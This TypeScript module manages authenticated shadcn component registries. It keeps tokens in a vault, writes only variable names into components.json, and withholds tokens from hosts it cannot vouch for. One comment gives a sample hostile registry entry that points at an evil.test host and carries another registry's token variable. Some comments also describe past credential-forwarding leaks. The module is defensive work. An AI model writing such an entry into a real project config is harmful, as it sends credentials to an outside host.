import { operatorRegistryNamespaces, operatorRegistryToken } from './ui-kit-operator-keys';
import { assertSafeEnvName, UiKitCliError } from './ui-kit-cli';

/**
 * Registries the shadcn CLI may install from, and how each one authenticates.
 *
 * shadcn resolves a namespaced item (`@acme/auth`) through the `registries`
 * field of `components.json`, where a private registry carries an
 * `Authorization` header or a query param whose value is `${SOME_TOKEN}` — an
 * env var the CLI interpolates at run time. So "let the client put their key
 * in" is, concretely: keep the token in the Nexus vault, render a `${VAR}`
 * reference into `components.json`, and hand the value to the child through
 * the credential-shaped env channel in ui-kit-cli.ts.
 *
 * The token therefore never lands in `components.json`, never lands in argv,
 * and never lands in the repo. What lands on disk is the NAME of a variable.
 *
 * Verified against https://ui.shadcn.com/docs/registry/authentication
 * (2026-10-21).
 */

/** The public registry. No key, no configuration, always available. */
export const SHADCN_DEFAULT_NAMESPACE = '@shadcn';

export const UI_KIT_REGISTRY_NAMESPACE_PATTERN = /^@[a-z0-9][a-z0-9-]*$/;
export const UI_KIT_MAX_NAMESPACE_CHARS = 48;
export const UI_KIT_MAX_REGISTRY_URL_CHARS = 512;
/** An HTTP header name, per RFC 7230 token rules (the subset we accept). */
export const UI_KIT_HEADER_NAME_PATTERN = /^[A-Za-z][A-Za-z0-9-]*$/;
export const UI_KIT_PARAM_NAME_PATTERN = /^[A-Za-z][A-Za-z0-9_-]*$/;
export const UI_KIT_MAX_REGISTRIES = 32;

export type UiKitRegistryAuthKind = 'header' | 'param';

export interface UiKitRegistryAuth {
  readonly kind: UiKitRegistryAuthKind;
  /** `Authorization`, `X-API-Key`, or the query-param name for `param`. */
  readonly name: string;
  /** The env var the CLI interpolates, e.g. `REGISTRY_TOKEN`. */
  readonly envVar: string;
  /** `bearer` renders `Bearer ${VAR}`; `raw` renders `${VAR}` alone. */
  readonly scheme?: 'bearer' | 'raw';
}

export interface UiKitRegistry {
  readonly namespace: string;
  /** https URL containing the `{name}` placeholder. */
  readonly url: string;
  readonly auth?: UiKitRegistryAuth;
  /** Vault key holding the token, e.g. `external:ui-kit-registry-acme`. */
  readonly secretKey?: string;
  readonly label?: string;
}

/**
 * Registries we know the shape of, offered as a one-click prefill.
 *
 * What ships is CONFIGURATION — the namespace, the public URL and the NAME of
 * the variable the CLI interpolates. The token is the operator's own licence
 * and goes in their vault — except for the namespaces the operator chose to
 * bundle with Nexus itself (see `ui-kit-operator-keys.ts`, decision 21/10):
 * for those a token also resolves from the bundle, as a last resort behind
 * the vault and the environment.
 *
 * The URL and header shape come from each vendor's own published setup
 * instructions. The variable name is ours and is per-namespace on purpose: the
 * vendors all document a bare `REGISTRY_TOKEN`, which would collide the moment
 * a project uses two paid kits.
 */
export interface KnownUiKitRegistry {
  readonly namespace: string;
  readonly label: string;
  readonly url: string;
  readonly site: string;
  /** What the operator has to have bought for the token to work. */
  readonly note: string;
}

export const KNOWN_UI_KIT_REGISTRIES: readonly KnownUiKitRegistry[] = [
  {
    namespace: '@shadcnuikit',
    label: 'Shadcn UI Kit',
    url: 'https://shadcnuikit.com/r/{name}.json',
    site: 'https://shadcnuikit.com',
    note: 'Admin dashboards, blocks and templates. Paid: paste your own API key.',
  },
];

export function findKnownRegistry(namespace: string): KnownUiKitRegistry | null {
  const value = namespace.trim().toLowerCase();
  return (
    KNOWN_UI_KIT_REGISTRIES.find(
      (entry) => entry.namespace.toLowerCase() === value,
    ) ?? null
  );
}

export function assertRegistryNamespace(raw: string): string {
  const value = raw.trim();
  if (
    value.length === 0 ||
    value.length > UI_KIT_MAX_NAMESPACE_CHARS ||
    !UI_KIT_REGISTRY_NAMESPACE_PATTERN.test(value)
  ) {
    throw new UiKitCliError(
      'INVALID_NAMESPACE',
      `a registry namespace looks like @acme, got: ${value.slice(0, 48)}`,
    );
  }
  return value;
}

export function assertRegistryUrl(raw: string): string {
  const value = raw.trim();
  if (value.length === 0 || value.length > UI_KIT_MAX_REGISTRY_URL_CHARS) {
    throw new UiKitCliError('INVALID_REGISTRY_URL', 'empty or oversized registry URL');
  }
  let parsed: URL;
  try {
    parsed = new URL(value);
  } catch {
    throw new UiKitCliError(
      'INVALID_REGISTRY_URL',
      `unparseable registry URL: ${value.slice(0, 64)}`,
    );
  }
  if (parsed.protocol !== 'https:') {
    // A registry serves code that lands in the project. Over plain HTTP
    // anyone on the path chooses that code.
    throw new UiKitCliError(
      'INSECURE_REGISTRY_URL',
      'a registry URL must be https',
    );
  }
  if (parsed.username || parsed.password) {
    // Credentials in the URL would be written into components.json in clear.
    throw new UiKitCliError(
      'INVALID_REGISTRY_URL',
      'a registry URL may not carry a username or password; use a token header',
    );
  }
  if (!value.includes('{name}')) {
    throw new UiKitCliError(
      'INVALID_REGISTRY_URL',
      'a registry URL must contain the {name} placeholder',
    );
  }
  return value;
}

function assertAuth(auth: UiKitRegistryAuth): UiKitRegistryAuth {
  const name = auth.name.trim();
  const pattern =
    auth.kind === 'header'
      ? UI_KIT_HEADER_NAME_PATTERN
      : UI_KIT_PARAM_NAME_PATTERN;
  if (name.length === 0 || name.length > 64 || !pattern.test(name)) {
    throw new UiKitCliError(
      'INVALID_AUTH_NAME',
      `a registry ${auth.kind} name must match ${String(pattern)}, got: ${name.slice(0, 48)}`,
    );
  }
  // THE RUNNER'S OWN RULE, not a weaker copy of it.
  //
  // This used to check only UPPER_SNAKE_CASE, so a declared name like `FOO`
  // was persisted, `ensureProjectRegistries` wrote `${FOO}` into the
  // project's components.json, and the run then refused the same name for
  // lacking a credential word — the project's configuration was edited by an
  // install that could never execute. Calling `assertSafeEnvName` means a
  // name that cannot travel is refused at configuration time, and the two
  // cannot drift apart again.
  assertSafeEnvName(auth.envVar);
  return { ...auth, name, scheme: auth.scheme ?? 'bearer' };
}

export function assertRegistry(registry: UiKitRegistry): UiKitRegistry {
  const namespace = assertRegistryNamespace(registry.namespace);
  const normalized: UiKitRegistry = {
    ...registry,
    namespace,
    url: assertRegistryUrl(registry.url),
    // DERIVED, never carried — BOTH secret selectors.
    //
    // A caller-supplied `secretKey` would be a vault name chosen outside Main:
    // a compromised renderer could point a registry at `auth:session`, pass
    // the configured-URL checks, and have the install read that secret and
    // send it to the registry's host. The same held for `auth.envVar`, which
    // I left coming from settings when I fixed the vault side: `OPENAI_API_KEY`
    // and `GH_TOKEN` both satisfy `assertSafeEnvName`, so naming one of them
    // plus a chosen URL forwarded that credential just as well. The kind and
    // the header name stay the operator's — they select nothing.
    secretKey: registrySecretKey(namespace),
    ...(registry.auth
      ? { auth: { ...assertAuth(registry.auth), envVar: derivedRegistryEnvVar(namespace) } }
      : {}),
  };
  return normalized;
}

export function assertRegistries(
  registries: readonly UiKitRegistry[],
): readonly UiKitRegistry[] {
  if (registries.length > UI_KIT_MAX_REGISTRIES) {
    throw new UiKitCliError(
      'TOO_MANY_REGISTRIES',
      `at most ${UI_KIT_MAX_REGISTRIES} registries`,
    );
  }
  const seen = new Set<string>();
  return registries.map((registry) => {
    const normalized = assertRegistry(registry);
    if (seen.has(normalized.namespace)) {
      throw new UiKitCliError(
        'DUPLICATE_NAMESPACE',
        `${normalized.namespace} is configured twice`,
      );
    }
    seen.add(normalized.namespace);
    return normalized;
  });
}

/**
 * The shape that may be PERSISTED into settings: everything but the derived
 * `secretKey`. Settings deliberately hold no vault names — a `secretKey` that
 * traveled through a settings file would be a vault name chosen outside Main,
 * and both the token read and the panel's "token stored" flag would then trust
 * a stored row instead of deriving it.
 */
export function persistableRegistry(registry: UiKitRegistry): UiKitRegistry {
  const { secretKey: _derived, ...rest } = assertRegistry(registry);
  return rest;
}

/**
 * Settings rows as this module understands them: each one re-validated, an
 * unusable one DROPPED instead of taken on trust. A settings file is data on
 * disk, not a caller — a stale or hand-edited row must not break the whole
 * panel, nor reach a token read with a `secretKey` it carried in.
 */
export function normalizeConfiguredRegistries(
  stored: readonly unknown[],
): readonly UiKitRegistry[] {
  const normalized: UiKitRegistry[] = [];
  for (const entry of stored) {
    try {
      normalized.push(assertRegistry(entry as UiKitRegistry));
    } catch {
      // Unusable configuration is not a reason to break the whole panel.
    }
  }
  return normalized;
}

export type RenderedRegistryEntry =
  | string
  | {
      readonly url: string;
      readonly headers?: Readonly<Record<string, string>>;
      readonly params?: Readonly<Record<string, string>>;
    };

/**
 * Render one registry for `components.json`. A keyless registry is a bare URL
 * string; an authenticated one carries `${VAR}` — the NAME of the variable,
 * never its value.
 */
export function renderRegistryEntry(
  registry: UiKitRegistry,
): RenderedRegistryEntry {
  const normalized = assertRegistry(registry);
  if (!normalized.auth) return normalized.url;
  const reference = `\${${normalized.auth.envVar}}`;
  if (normalized.auth.kind === 'param') {
    return {
      url: normalized.url,
      params: { [normalized.auth.name]: reference },
    };
  }
  const value =
    normalized.auth.scheme === 'raw' ? reference : `Bearer ${reference}`;
  return { url: normalized.url, headers: { [normalized.auth.name]: value } };
}

/**
 * Merge our registries into an existing `components.json` object WITHOUT
 * mutating it and without dropping anything the project already configured
 * (a namespace Nexus does not manage stays exactly as it was).
 */
export function mergeRegistriesIntoComponentsJson(
  existing: Readonly<Record<string, unknown>>,
  registries: readonly UiKitRegistry[],
): Record<string, unknown> {
  const normalized = assertRegistries(registries);
  const current =
    existing.registries && typeof existing.registries === 'object'
      ? (existing.registries as Record<string, unknown>)
      : {};
  const merged: Record<string, unknown> = { ...current };
  for (const registry of normalized) {
    merged[registry.namespace] = renderRegistryEntry(registry);
  }
  return { ...existing, registries: merged };
}

export interface RegistryEnvResult {
  /** Only the tokens that were actually found in the vault. */
  readonly env: Readonly<Record<string, string>>;
  /** Namespaces whose token is configured but missing. Reported, not guessed. */
  readonly missing: readonly string[];
}

/**
 * Resolve registry tokens from the vault into the env the child will get.
 *
 * A registry whose token is absent is NOT dropped silently: its namespace
 * comes back in `missing` so the caller can say "@acme needs its key" instead
 * of letting the CLI fail with a bare 401.
 */
export function buildRegistryEnv(
  registries: readonly UiKitRegistry[],
  lookupSecret: (secretKey: string) => string | null | undefined,
): RegistryEnvResult {
  const env: Record<string, string> = {};
  const missing: string[] = [];
  for (const registry of assertRegistries(registries)) {
    if (!registry.auth) continue;
    const secretKey = registry.secretKey;
    const token = secretKey ? lookupSecret(secretKey) : null;
    if (typeof token === 'string' && token.trim().length > 0) {
      env[registry.auth.envVar] = token.trim();
    } else {
      missing.push(registry.namespace);
    }
  }
  return { env, missing };
}

/**
 * The host a registry URL points at, for comparing two of them.
 *
 * An unparseable URL answers the raw string: it can then only equal an
 * identical string, which keeps "unknown shape" on the safe side of the
 * comparison instead of accidentally matching a real host.
 */
export function hostOfRegistryUrl(url: string): string {
  try {
    return new URL(url).host.toLowerCase();
  } catch {
    return url.trim().toLowerCase();
  }
}

/** The variable this registry's token travels in. Name only, never a value. */
export function derivedRegistryEnvVar(namespace: string): string {
  return `${namespace
    .trim()
    .replace(/^@/, '')
    .replace(/[^a-zA-Z0-9]+/g, '_')
    .toUpperCase()}_REGISTRY_TOKEN`;
}

/**
 * The auth contract to persist for a registry the operator just saved.
 *
 * Order is the whole point. Re-saving an existing private registry without
 * typing the token again used to DROP its auth: the stored entry lost the
 * contract, the project's `components.json` went back to a bare URL, installs
 * ran unauthenticated, nothing reported a missing key, and the vault token sat
 * orphaned. So an explicit contract wins, then the one already stored, and
 * only then is one derived — for a token being saved now, or for a registry
 * whose shape ships with Nexus, which is what makes the
 * environment-variable path reachable before any key exists.
 *
 * A registry with no stored contract, no token and no preset stays public.
 */
export function resolveRegistryAuthContract(input: {
  readonly namespace: string;
  /** A contract the caller states outright. */
  readonly declared?: UiKitRegistryAuth | undefined;
  /** The contract already stored for this namespace, if any. */
  readonly stored?: UiKitRegistryAuth | undefined;
  /** The URL being saved, and the one already stored for this namespace. */
  readonly url?: string | undefined;
  readonly storedUrl?: string | undefined;
  readonly hasToken: boolean;
}): UiKitRegistryAuth | undefined {
  // ONE GATE, THEN THE SHAPE.
  //
  // A contract is what releases the token: `buildScopedRegistryEnv` skips any
  // registry without one, and `resolveRegistryToken` then reads this
  // namespace's vault key and hands it to the URL's host. So the question is
  // never "which contract" first — it is "may this URL have a credential at
  // all". Three ways to say yes, and nothing else:
  //
  //   - a token is being typed NOW: the operator chose that destination;
  //   - the URL is EXACTLY the one already stored: the credential already
  //     goes there, and this is the re-save that must not drop its auth;
  //   - the namespace is a preset and the URL is on the preset's own HOST:
  //     the only URL Nexus itself vouches for.
  //
  // Each piece of this gate was a separate leak, found one review round
  // apart, because the check used to sit in the middle of the shape decision
  // instead of in front of it: `declared` comes from the caller and walked
  // past a changed host; a known namespace derived a contract for any URL;
  // and with NO stored row there was nothing to compare, so `declared` walked
  // past again. Keep this gate first and whole — adding a shape branch above
  // it reopens the class.
  //
  // Nothing is deleted from the vault to achieve this (the operator asked that
  // their credentials not be removed): with no contract the token is
  // unreachable rather than gone.
  const known = findKnownRegistry(input.namespace);
  const atPresetHost =
    known !== null &&
    (input.url === undefined ||
      hostOfRegistryUrl(known.url) === hostOfRegistryUrl(input.url));
  // The whole URL, not the host: a different path on the same host is a
  // different registry, and the stored SHAPE (a vendor's own header name) was
  // not agreed for it. The operator retypes the token, and the panel says so.
  const sameStoredUrl = input.storedUrl !== undefined && input.storedUrl === input.url;
  if (!input.hasToken && !sameStoredUrl && !atPresetHost) return undefined;

  if (input.declared) return input.declared;
  if (input.stored && sameStoredUrl) return input.stored;
  return {
    kind: 'header',
    name: 'Authorization',
    envVar: derivedRegistryEnvVar(input.namespace),
  };
}

/**
 * Whether the registry just written is actually IN the settings.
 *
 * `replaceOrchSettings` answers the PREVIOUS settings when the merged object
 * fails the schema and throws nothing — a 33rd registry against the schema's
 * cap of 32 is the easy way to see it. The receipt went out anyway, so the
 * panel cleared every field while the token written a moment earlier had no
 * registry left to belong to. Reading the row back covers that mode and every
 * other silent one, which a length check would not.
 */
export function registrySaveOutcome(input: {
  readonly namespace: string;
  readonly url: string;
  readonly persisted:
    | readonly { readonly namespace: string; readonly url: string }[]
    | undefined;
}): { readonly saved: true } | { readonly saved: false; readonly error: string } {
  const namespace = input.namespace.trim();
  const landed = input.persisted?.find((entry) => entry.namespace === namespace);
  if (landed && landed.url === input.url) return { saved: true };
  return {
    saved: false,
    error:
      `o registry não ficou salvo nas configurações (o limite é ` +
      `${UI_KIT_MAX_REGISTRIES} registries); a chave digitada não foi mantida`,
  };
}

/**
 * Whether the removal actually landed in the settings.
 *
 * The mirror of `registrySaveOutcome`, and for the same reason: the vault is
 * cleared FIRST, so a settings write that does not land (it throws, or the
 * merged object fails the schema and the previous list comes back) leaves the
 * row on screen with its token already destroyed, and every later install
 * fails until the operator types the credential again. The caller restores the
 * token when this says no.
 */
export function registryRemovalOutcome(input: {
  readonly namespace: string;
  readonly persisted:
    | readonly { readonly namespace: string }[]
    | undefined;
}): { readonly removed: true } | { readonly removed: false; readonly error: string } {
  const namespace = input.namespace.trim();
  const stillThere =
    input.persisted === undefined ||
    input.persisted.some((entry) => entry.namespace === namespace);
  if (!stillThere) return { removed: true };
  return {
    removed: false,
    error:
      'as configurações não aceitaram a remoção; o registry continua na lista ' +
      'e o token foi devolvido ao cofre',
  };
}

/**
 * What removing a registry does, decided before anything is written.
 *
 * The vault goes FIRST and its answer decides: secure storage can refuse the
 * delete (a locked keychain, a backend that is not there), and that answer
 * used to be dropped on the floor — the row went away, the panel reported the
 * registry gone, and the token stayed. Re-adding that namespace later would
 * then pick the supposedly removed credential straight back up.
 *
 * Nothing here deletes a row the operator can still see: a refusal keeps the
 * registry listed, with its reason, so the removal can be retried once the
 * vault is reachable.
 */
export function planRegistryRemoval(input: {
  readonly registries: readonly UiKitRegistry[];
  readonly namespace: string;
  readonly cleared: { readonly ok: boolean; readonly error?: string | undefined };
}):
  | { readonly removed: true; readonly registries: readonly UiKitRegistry[] }
  | { readonly removed: false; readonly error: string } {
  if (!input.cleared.ok) {
    return {
      removed: false,
      error:
        input.cleared.error ??
        'o cofre recusou apagar o token; o registry continua na lista',
    };
  }
  const namespace = input.namespace.trim();
  return {
    removed: true,
    registries: input.registries.filter((entry) => entry.namespace !== namespace),
  };
}

/** The vault key for a registry's token, derived from its namespace. */
export function registrySecretKey(namespace: string): string {
  const normalized = assertRegistryNamespace(namespace);
  return `external:ui-kit-registry-${normalized.slice(1)}`;
}

/**
 * The registries active on this machine: what the operator configured, plus a
 * bundle-backed entry for every namespace the operator ships a token for and
 * has not configured here.
 *
 * This is what makes the bundled key work with ZERO setup: without it, the
 * release path only considers configured namespaces, so a fresh machine would
 * withhold the operator's own token behind "unmapped". An explicit settings
 * entry always wins outright — the bundled entry is only ADDED where the
 * namespace is absent — so re-pointing or re-keying one in the panel stays
 * possible and stays authoritative.
 *
 * Read paths only. The settings WRITE paths keep the raw list, so saving a
 * registry never persists these derived rows into settings.
 */
export function withOperatorRegistries(
  configured: readonly UiKitRegistry[],
): readonly UiKitRegistry[] {
  const present = new Set(configured.map((registry) => registry.namespace));
  const added: UiKitRegistry[] = [];
  for (const namespace of operatorRegistryNamespaces()) {
    if (present.has(namespace)) continue;
    const known = findKnownRegistry(namespace);
    if (!known) continue;
    added.push({
      namespace,
      url: known.url,
      auth: {
        kind: 'header',
        name: 'Authorization',
        envVar: derivedRegistryEnvVar(namespace),
      },
      secretKey: registrySecretKey(namespace),
      label: known.label,
    });
  }
  return added.length > 0 ? [...configured, ...added] : configured;
}

/**
 * The namespace → URL map the PROJECT declares in `components.json`.
 *
 * This matters for credential scope: shadcn resolves a namespace through the
 * project's own file, so if that file maps `@acme` to someone else's host, our
 * token would be sent there. Tokens are therefore only released for a
 * namespace the project maps to the URL we configured.
 */
export function projectRegistryUrls(
  componentsJson: Readonly<Record<string, unknown>> | null,
): ReadonlyMap<string, string> {
  const out = new Map<string, string>();
  if (!componentsJson) return out;
  const registries = componentsJson.registries;
  if (!registries || typeof registries !== 'object') return out;
  for (const [namespace, value] of Object.entries(
    registries as Record<string, unknown>,
  )) {
    if (typeof value === 'string') {
      out.set(namespace, value);
      continue;
    }
    if (value && typeof value === 'object') {
      const url = (value as { url?: unknown }).url;
      if (typeof url === 'string') out.set(namespace, url);
    }
  }
  return out;
}

/** The namespace → raw entry map, for decisions the URL alone cannot make. */
export function projectRegistryEntries(
  componentsJson: Readonly<Record<string, unknown>> | null,
): ReadonlyMap<string, unknown> {
  const out = new Map<string, unknown>();
  if (!componentsJson) return out;
  const registries = componentsJson.registries;
  if (!registries || typeof registries !== 'object') return out;
  for (const [namespace, value] of Object.entries(
    registries as Record<string, unknown>,
  )) {
    out.set(namespace, value);
  }
  return out;
}

/**
 * Whether the project's entry for OUR namespace is missing the auth we manage.
 *
 * A project that maps `@acme` to the bare URL string agrees about the host but
 * interpolates nothing, so shadcn sends the request unauthenticated and the
 * registry answers 401 — while the token sat in the child's environment for
 * nothing. Completing that entry is finishing our own managed mapping.
 *
 * An entry that already carries `headers` or `params` is NOT touched: that is
 * the project's own auth, and overwriting it would be the same class of
 * surprise as repointing its URL. The env builder withholds the token there
 * and reports it instead.
 */
export function registryEntryNeedsAuth(
  registry: UiKitRegistry,
  entry: unknown,
): boolean {
  if (!registry.auth) return false;
  if (typeof entry === 'string') return true;
  if (!entry || typeof entry !== 'object') return false;
  const shape = entry as { headers?: unknown; params?: unknown };
  return shape.headers === undefined && shape.params === undefined;
}

/**
 * Which namespaces in the project's components.json reference each `${VAR}`.
 *
 * This closes the real leak. shadcn interpolates `${VAR}` from the environment
 * into registry config that lives in the PROJECT's file — and that file can
 * come from a repository we do not control. Checking only that `@acme` points
 * at our URL is not enough: a second entry
 *
 *     "@other": { "url": "https://evil.test/{name}.json",
 *                 "headers": { "Authorization": "Bearer ${ACME_REGISTRY_TOKEN}" } }
 *
 * would send our token to that host the moment a run touches `@other`. So a
 * token is released only when the ONLY entry naming its variable is the
 * namespace it belongs to.
 */
export function envVarReferences(
  componentsJson: Readonly<Record<string, unknown>> | null,
): ReadonlyMap<string, ReadonlySet<string>> {
  const out = new Map<string, Set<string>>();
  if (!componentsJson) return out;
  const registries = componentsJson.registries;
  if (!registries || typeof registries !== 'object') return out;
  const pattern = /\$\{([A-Za-z_][A-Za-z0-9_]*)\}/g;
  for (const [namespace, value] of Object.entries(
    registries as Record<string, unknown>,
  )) {
    // Walk the whole entry: a variable can hide in headers, params or a URL.
    const serialized = JSON.stringify(value ?? '');
    for (const match of serialized.matchAll(pattern)) {
      const name = match[1];
      if (!name) continue;
      const seen = out.get(name) ?? new Set<string>();
      seen.add(namespace);
      out.set(name, seen);
    }
  }
  return out;
}

export interface ScopedRegistryEnvInput {
  readonly registries: readonly UiKitRegistry[];
  /** Namespaces the command actually references. */
  readonly referenced: readonly string[];
  /** What the project's components.json maps today. */
  readonly projectUrls: ReadonlyMap<string, string>;
  /** Which namespaces reference each `${VAR}` in that same file. */
  readonly envReferences?: ReadonlyMap<string, ReadonlySet<string>>;
  readonly lookupSecret: (secretKey: string) => string | null | undefined;
  /** The operator's own environment, consulted when the vault has nothing. */
  readonly environment?: NodeJS.ProcessEnv;
}

export interface ScopedRegistryEnvResult extends RegistryEnvResult {
  /** Namespaces the project maps to a DIFFERENT host than the one configured. */
  readonly conflicts: readonly string[];
  /** Configured and referenced, but the project does not declare them. */
  readonly unmapped: readonly string[];
  /**
   * Namespaces withheld because another entry in the project's file also
   * references their token variable.
   */
  readonly hijacked: readonly string[];
  /**
   * Namespaces whose entry in the project's file interpolates no variable at
   * all, so the token could not be used even if it were released.
   */
  readonly unreferenced: readonly string[];
}

/** The public registry is trusted by definition; it carries no credential. */
function isTrustedNamespace(
  namespace: string,
  configured: readonly UiKitRegistry[],
): boolean {
  if (namespace === SHADCN_DEFAULT_NAMESPACE) return true;
  return configured.some((registry) => registry.namespace === namespace);
}

/**
 * The token for one registry: the operator's vault first, then their own
 * environment, then the key the operator bundles with Nexus.
 *
 * The environment fallback is there so an operator can provision their OWN
 * machines and team once — export `ACME_REGISTRY_TOKEN` and every Nexus on
 * that machine picks it up — instead of pasting the key per install. It reads
 * the environment of the Nexus process, which is the operator's own
 * configuration.
 *
 * The bundled fallback (`ui-kit-operator-keys.ts`, decision 21/10) exists so
 * the operator's key works on every machine that runs their Nexus build with
 * zero setup. It is last on purpose: a vault copy or an exported env var —
 * the operator's own newer key — always wins over the one baked into the app.
 */
export function isRegistrySecretKey(name: string): boolean {
  return /^external:ui-kit-registry-[a-z0-9][a-z0-9-]*$/.test(name);
}

/**
 * The bundled operator token for this registry, when there is one AND the
 * registry points at the vendor's own URL.
 *
 * The URL match is the exfiltration guard for a key that ships to every
 * client: settings on a client machine could map the namespace somewhere
 * else, and releasing the bundled token there would hand it to that host.
 * Only the vendor's published URL gets it. `assertRegistry`'s project-URL
 * check then still applies on top, release time.
 */
export function operatorTokenForRegistry(
  registry: Pick<UiKitRegistry, 'namespace' | 'url'>,
): string | null {
  const known = findKnownRegistry(registry.namespace);
  if (!known || known.url !== registry.url) return null;
  return operatorRegistryToken(registry.namespace);
}

export function resolveRegistryToken(
  registry: UiKitRegistry,
  lookupSecret: (secretKey: string) => string | null | undefined,
  environment: NodeJS.ProcessEnv = process.env,
  bundled: (registry: UiKitRegistry) => string | null = operatorTokenForRegistry,
): string | null {
  // Belt and braces on the ONE place a registry token is read: even if a
  // `secretKey` reached here from somewhere that did not derive it, only the
  // registry namespace is readable. `getSecret` itself has no reserved-name
  // guard (only writes do), so this is the guard.
  const key =
    registry.secretKey && isRegistrySecretKey(registry.secretKey)
      ? registry.secretKey
      : null;
  const stored = key ? lookupSecret(key) : null;
  if (typeof stored === 'string' && stored.trim().length > 0) return stored.trim();
  // The DERIVED name, not the stored one: a registry only ever reaches its own
  // variable, whatever a settings file claims.
  const fromEnv = registry.auth
    ? environment[derivedRegistryEnvVar(registry.namespace)]
    : undefined;
  if (typeof fromEnv === 'string' && fromEnv.trim().length > 0) return fromEnv.trim();
  const fromBundle = bundled(registry);
  if (typeof fromBundle === 'string' && fromBundle.trim().length > 0) {
    return fromBundle.trim();
  }
  return null;
}

/**
 * Resolve ONLY the tokens this run needs, and only when the project points the
 * namespace at the host we configured.
 *
 * Handing every configured token to every run means `add button` — a public
 * component — carries a private registry's credential into an untrusted npm
 * child for nothing.
 */
export function buildScopedRegistryEnv(
  input: ScopedRegistryEnvInput,
): ScopedRegistryEnvResult {
  const referenced = new Set(input.referenced.map((entry) => entry.trim()));
  const env: Record<string, string> = {};
  const missing: string[] = [];
  const conflicts: string[] = [];
  const unmapped: string[] = [];
  const hijacked: string[] = [];
  const unreferenced: string[] = [];
  const configured = assertRegistries(input.registries);
  const envReferences = input.envReferences ?? new Map();

  // A run that also touches a namespace we cannot vouch for releases nothing:
  // we have no way to know where that entry points or what it interpolates.
  const untrusted = [...referenced].filter(
    (namespace) => !isTrustedNamespace(namespace, configured),
  );
  if (untrusted.length > 0) {
    return {
      env: {},
      missing: [],
      conflicts: [],
      unmapped: [],
      hijacked: untrusted,
      unreferenced: [],
    };
  }

  for (const registry of configured) {
    if (!registry.auth) continue;
    if (!referenced.has(registry.namespace)) continue;

    const declared = input.projectUrls.get(registry.namespace);
    if (declared === undefined) {
      unmapped.push(registry.namespace);
      continue;
    }
    if (declared !== registry.url) {
      // The project points this namespace somewhere else. Releasing the token
      // would send it to that host.
      conflicts.push(registry.namespace);
      continue;
    }
    const referrers = envReferences.get(registry.auth.envVar);
    if (!referrers || referrers.size === 0) {
      // Nothing in the project's file interpolates this variable, so the child
      // cannot use the token: the request goes out unauthenticated and comes
      // back 401 while the secret rides along for nothing. Withhold it and
      // say so — `ensureProjectRegistries` is what completes such an entry.
      unreferenced.push(registry.namespace);
      continue;
    }
    const foreign = [...referrers].filter((name) => name !== registry.namespace);
    if (foreign.length > 0) {
      hijacked.push(registry.namespace);
      continue;
    }

    const token = resolveRegistryToken(registry, input.lookupSecret, input.environment);
    if (token) {
      env[registry.auth.envVar] = token;
    } else {
      missing.push(registry.namespace);
    }
  }

  return { env, missing, conflicts, unmapped, hijacked, unreferenced };
}
